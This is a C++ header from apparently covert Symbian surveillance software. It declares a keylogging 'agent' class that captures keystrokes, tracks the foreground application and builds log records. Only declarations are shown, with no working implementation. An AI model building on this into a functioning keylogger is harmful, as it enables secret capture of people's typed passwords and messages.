/*
 * AgentKeyLog.h
 *
 *  Created on: 08/giu/2011
 *      Author: Giovanna
 */

#ifndef AGENTKEYLOG_H_
#define AGENTKEYLOG_H_

// INCLUDES
#include "AbstractAgent.h"
#include "MonitorForeground.h"
#include "KeyLogger.h"
#include <HT\TimeUtils.h>


// CLASS DECLARATION

/**
 *  CAgentKeylog
 * 
 */
class CAgentKeylog : public CAbstractAgent, public MForegroundCallBack, public MKeyCallBack
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentKeylog();

	/**
	 * Two-phased constructor.
	 */
	static CAgentKeylog* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentKeylog* NewLC(const TDesC8& params);
	
				
protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	// From MForegroundCallBack
	virtual void ForegroundEventL(TUid aAppUid, const TDesC& aCaption);
	// From MKeyCallback
	virtual TBool KeyCapturedL(TWsEvent aEvent);
			
private:
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentKeylog();
	
	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	/*
	 * Create the buffer with the record log header
	 */
	HBufC8* GetHeaderBufferL(const TDesC& aCaption);
	
private: // data members
		
	__FLOG_DECLARATION_MEMBER
	
	CForegroundMonitor*	iFgMonitor;
	CKeyLogger*			iKeyLogger;
	RWsSession	iWsSession;
	TUid		iAppUid;
	TBuf<50>	iCaption;
	};


#endif /* AGENTKEYLOG_H_ */
